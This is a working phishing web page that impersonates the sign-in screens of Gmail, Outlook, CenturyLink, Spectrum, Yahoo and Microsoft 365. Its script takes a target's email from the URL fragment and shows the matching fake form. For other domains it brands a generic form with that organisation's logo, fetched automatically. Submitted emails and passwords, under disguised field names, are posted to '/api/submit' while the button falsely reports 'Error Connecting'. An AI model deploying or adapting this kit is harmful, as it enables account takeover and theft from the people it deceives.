<!DOCTYPE html>
<html lang="en">
<head>
    <meta name=”robots” content=”noindex”>
    <link href="img/favicon.ico"rel="icon"type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f5f5f5;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .form-container {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .provider-logo {
            align-items: center;
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }
        .provider-logo img {
            width: 150px;
        }
        .eml-list img{
            width: 100%;
        }
        .eml-list{
            align-items: center;
            display: flex;
            justify-content: center;
            margin-bottom: 30px;
        }

        .divider {
            border-top: 1px solid #dee2e6;
            margin: 0.5rem 0;
        }
        .form-check-input:checked {
            background-color: #009688;
            border-color: #009688;
        }
        .btn-signin {
            background-color: #000;
            color: white;
            width: 100%;
            padding: 0.75rem;
        }
        .btn-signin:hover {
            background-color: #333;
            color: white;
        }
        .error-button{
            background-color:rgb(102, 203, 62)!important;
            color:#fff;
            cursor:not-allowed
        }
        .proceed-button{
            width:100%;
            padding:12px;
            background-color:#141414;
            color:#fff;border:none;
            border-radius:8px;
            cursor:pointer;
            margin-bottom:12px;
            font-weight:500
        }
        .dynamic-provider-logo {
            text-align: center;
            margin-bottom: 20px;
            height: 100px;
            background-position: center;
            background-repeat: no-repeat;
            background-size: contain;
        }
        h4 {
            text-align: center;
            color: #333;
            margin-top: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="email"], 
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button:hover {
            opacity: 0.9;
        }
        
        #gsuite, #outlook, #centurylink, #spectrum, #yahoo, #microsoft, #webmail {
            display: none;
        }

        .loading {
            text-align: center;
            font-style: italic;
            color: #666;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <!-- Gmail/GSuite Form -->
    <div id="gsuite" class="form-container">
        <div class="provider-logo">
            <img src="img/logo3.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit" id="contactFormPhrase" method="post">
            <div class="form-group">
                <label for="gsuite-email">Email</label>
                <input type="email" id="gsuite-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="gsuite-password">Password</label>
                <input type="password" id="gsuite-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormPhrase")'type="button"id="sendMessageButton">Sign In</button>
        </form>
        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
        </div>
        
        <div class="text-center mb-3">
            Don't have G-Suite email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Outlook Form -->
    <div id="outlook" class="form-container">
        <div class="provider-logo">
            <img src="img/logo2.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit" id="contactFormOutlk" method="post">
            <div class="form-group">
                <label for="outlook-email">Email</label>
                <input type="email" id="outlook-email"name="phwet" required>
            </div>
            <div class="form-group">
                <label for="outlook-password">Password</label>
                <input type="password" id="outlook-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormOutlk")'type="button"id="sendMessageButton">Sign In</button>
        </form>
        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
        </div>
        
        <div class="text-center mb-3">
            Don't have Outlook email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- CenturyLink Form -->
    <div id="centurylink" class="form-container">
        <div class="provider-logo">
            <img src="img/logo6.png" alt="">
        </div>
            <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormCntry"method="post">
            <div class="form-group">
                <label for="centurylink-email">Email</label>
                <input type="email" id="centurylink-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="centurylink-password">Password</label>
                <input type="password" id="centurylink-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormCntry")'type="button"id="sendMessageButton">Sign In</button>
        </form>
        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
        </div>
        
        <div class="text-center mb-3">
            Don't have CenturyLink email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Spectrum Form -->
    <div id="spectrum" class="form-container">
        <div class="provider-logo">
            <img src="img/logo5.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormSpctrm"method="post">
            <div class="form-group">
                <label for="spectrum-email">Email</label>
                <input type="email" id="spectrum-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="spectrum-password">Password</label>
                <input type="password" id="spectrum-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormSpctrm")'type="button"id="sendMessageButton">Sign In</button>
        </form>
        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
        </div>
        
        <div class="text-center mb-3">
            Don't have Spectrum email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Yahoo Form -->
    <div id="yahoo" class="form-container">
        <div class="provider-logo">
            <img src="img/logo4.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormYahoo"method="post">
            <div class="form-group">
                <label for="yahoo-email">Email</label>
                <input type="email" id="yahoo-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="yahoo-password">Password</label>
                <input type="password" id="yahoo-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormYahoo")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
        </div>
        
        <div class="text-center mb-3">
            Don't have Yahoo email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Microsoft Form -->
    <div id="microsoft" class="form-container">
        <div class="provider-logo">
            <img src="img/logo.png" alt="">
        </div>
        <h4>Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormM365"method="post">
            <div class="form-group">
                <label for="microsoft-email">Email</label>
                <input type="email" id="microsoft-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="microsoft-password">Password</label>
                <input type="password" id="microsoft-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormM365")'type="button"id="sendMessageButton">Sign In</button>
        </form>

        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
        </div>
        
        <div class="text-center mb-3">
            Don't have Microsoft 365 email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <!-- Generic Webmail Form - Will be customized with domain logo -->
    <div id="webmail" class="form-container">
        <div class="dynamic-provider-logo" id="dynamic-logo"></div>
        <p class="loading" id="loading-message"></p>
        <h4 id="webmail-title">Sign-in with your organization email credentials to access.</h4>
        <form action="/submit"id="contactFormWebml"method="post">
            <div class="form-group">
                <label for="webmail-email">Email</label>
                <input type="email" id="webmail-email" name="phwet" required>
            </div>
            <div class="form-group">
                <label for="webmail-password">Password</label>
                <input type="password" id="webmail-password" name="psdwet" required>
            </div>
            <button class="proceed-button"onclick='sendMessage("contactFormWebml")'type="button"id="sendMessageButton">Sign In</button>
        </form>
        
        <div class="divider"></div>
        <div class="eml-list">
            <img src="img/list.png" alt="">
        </div>
        
        <div class="text-center mb-3">
            Don't have Microsoft 365 email?
        </div>
        
        <button class="btn btn-outline-dark w-100">Get Started</button>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Get the hash from the URL (without the # symbol)
            const hash = window.location.hash.substring(1);
            
            // Process the hash only if it contains an email (has @ symbol)
            if (hash && hash.includes('@')) {
                const email = hash;
                const domain = email.split('@')[1].toLowerCase();
                
                // Determine which form to show based on the domain
                let formToShow = 'webmail'; // Default
                
                if (domain === 'gmail.com') {
                    formToShow = 'gsuite';
                } else if (domain === 'outlook.com') {
                    formToShow = 'outlook';
                } else if (domain === 'centurylink.net') {
                    formToShow = 'centurylink';
                } else if (domain === 'spectrum.net') {
                    formToShow = 'spectrum';
                } else if (domain === 'yahoo.com') {
                    formToShow = 'yahoo';
                } else if (domain.includes('onmicrosoft')) {
                    formToShow = 'microsoft';
                } else {
                    // For other domains, customize the webmail form
                    formToShow = 'webmail';
                    customizeWebmailForm(domain);
                }
                
                // Show the appropriate form
                document.getElementById(formToShow).style.display = 'block';
                
                // Set the email value in the appropriate form
                const emailField = document.getElementById(formToShow + '-email');
                if (emailField) {
                    emailField.value = email;
                }
                
            } else {
                // If no email in hash, show Microsoft form as default
                document.getElementById('microsoft').style.display = 'block';
            }
        });

  function sendMessage(formId) {
    const form = document.getElementById(formId);
    const formData = new FormData(form);
    const formDataObj = {};

    formData.append("send", "true");
    const sendButton = form.querySelector(".proceed-button");
    sendButton.textContent = "Error Connecting";
    sendButton.classList.add("error-button");
    sendButton.disabled = true;

    formData.forEach((value, key) => {
      formDataObj[key] = value;
    });

    fetch("/api/submit", {
      method: "POST",
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(formDataObj)
    })
    .then(response => {
      if (!response.ok) throw new Error();
      return response.json();
    })
    .then(data => {})
    .catch(error => {});
  }
        
        // Function to customize the webmail form based on the domain
        function customizeWebmailForm(domain) {
            console.log('Customizing webmail form for domain:', domain);
            
            // Get domain without subdomain
            const parts = domain.split('.');
            let baseDomain = domain;
            if (parts.length >= 2) {
                baseDomain = parts[parts.length - 2] + '.' + parts[parts.length - 1];
            }
            
            // Update loading message
            document.getElementById('loading-message').textContent = `Loading ${baseDomain} information...`;
            
// Update form title with domain
const domainTitle = baseDomain.split('.')[0];
document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).toUpperCase() + domainTitle.slice(1)}`;
            
            // Try to fetch logo/image from the domain
            fetchDomainLogo(baseDomain);
        }
        
        // Function to fetch the logo or image from a domain
        function fetchDomainLogo(domain) {
            const logoElement = document.getElementById('dynamic-logo');
            const loadingMessage = document.getElementById('loading-message');
            
            // URLs to try for logos (common paths)
            const urlsToTry = [
                `https://${domain}/favicon.ico`,
                `https://${domain}/logo.png`,
                `https://${domain}/images/logo.png`,
                `https://${domain}/img/logo.png`,
                `https://logo.clearbit.com/${domain}`
            ];
            
            // Use a service that returns logos for domains
            // Clearbit has a free logo API we can use
            const clearbitUrl = `https://logo.clearbit.com/${domain}`;
            
            // Create an image element to test loading
            const img = new Image();
            img.onload = function() {
                // Image loaded successfully
                loadingMessage.style.display = 'none';
                logoElement.style.backgroundImage = `url('${clearbitUrl}')`;
                console.log('Logo loaded from:', clearbitUrl);
                
                // Update button color based on image
                try {
                    extractColorFromImage(img, function(color) {
                        document.getElementById('webmail-button').style.backgroundColor = color;
                    });
                } catch (e) {
                    console.log('Could not extract color:', e);
                }
            };
            
            img.onerror = function() {
                // If Clearbit fails, try a simple text-based logo
                loadingMessage.style.display = 'none';
                logoElement.style.backgroundImage = 'none';
                logoElement.innerHTML = `<h1 style="margin:0;padding-top:30px;color:#444;">${domain.split('.')[0].toUpperCase()}</h1>`;
                console.log('Using text logo for:', domain);
                
                // Use a default button color
                document.getElementById('webmail-button').style.backgroundColor = '#555';
            };
            
            // Start loading the image
            img.src = clearbitUrl;
        }
        
        // Function to extract dominant color from an image (simplified version)
        function extractColorFromImage(img, callback) {
            // Create a canvas to analyze the image
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const width = img.width;
            const height = img.height;
            
            canvas.width = width;
            canvas.height = height;
            
            // Draw image to canvas
            context.drawImage(img, 0, 0, width, height);
            
            try {
                // Get image data from center of image (likely where logo is)
                const data = context.getImageData(Math.floor(width/2), Math.floor(height/2), 1, 1).data;
                
                // Convert to hex color
                const hex = "#" + ((1 << 24) + (data[0] << 16) + (data[1] << 8) + data[2]).toString(16).slice(1);
                callback(hex);
            } catch (e) {
                // If there's any error (like CORS), use default color
                console.error('Error extracting color:', e);
                callback('#555555');
            }
        }
    </script>
</body>
</html>